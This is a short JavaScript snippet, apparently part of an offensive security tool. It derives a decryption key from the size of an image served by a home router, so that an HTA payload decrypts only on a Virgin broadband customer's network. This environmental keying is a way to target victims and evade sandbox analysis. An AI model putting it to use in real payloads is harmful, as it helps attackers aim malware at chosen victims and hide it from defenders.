// WINNER, 🏆 2019 Guardies – best execution guardrails in an offensive security tool public release – https://twitter.com/ItsReallyNick/status/1189622906369781762 
var getKey = function (){
	// replace function name with one specified in your HTA file
	var img = new Image();
	img.src = 'http://192.168.0.1/vm_logo_foot.png';
	document.body.appendChild(img);
	var k = img.width * img.height * 1337;
	// key will be 3099166 if the target is a Virgin broadband customer
	// 0 if not - causing the payload and filename to decrypt incorrectly :)
	return k.toString();
}
